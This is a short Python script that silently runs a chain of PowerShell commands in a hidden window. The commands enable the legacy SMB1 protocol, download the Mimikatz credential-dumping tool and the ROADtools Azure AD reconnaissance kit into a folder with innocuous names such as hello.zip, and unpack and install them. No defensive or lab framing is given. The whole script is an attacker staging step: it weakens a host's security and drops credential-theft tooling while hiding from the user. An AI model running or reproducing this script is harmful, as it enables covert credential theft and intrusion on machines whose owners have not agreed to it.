import subprocess

COMMANDS = [
    r'Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart',
    r'mkdir C:\hello',
    r'curl.exe -L https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -o C:\hello\hello.zip',
    r'curl.exe -L https://github.com/dirkjanm/roadtools.git -o C:\hello\roadtools.zip',
    r'Expand-Archive -Path "C:/hello/roadtools.zip" -DestinationPath "C:/hello/road"',
    r'Expand-Archive -Path "C:/hello/hello.zip" -DestinationPath "C:/hello/hello"',
    r'pip install roadlib/',
    r'pip install roadtx/',
    r'pip install roadrecon/',
]

def run_powershell(command: str):
    result = subprocess.run(
        ["powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", command],
        capture_output=True,
        text=True,
        creationflags=subprocess.CREATE_NO_WINDOW  # hide CMD
    )
    return result.returncode

if __name__ == "__main__":
    combined = "; ".join(COMMANDS)
    run_powershell(combined)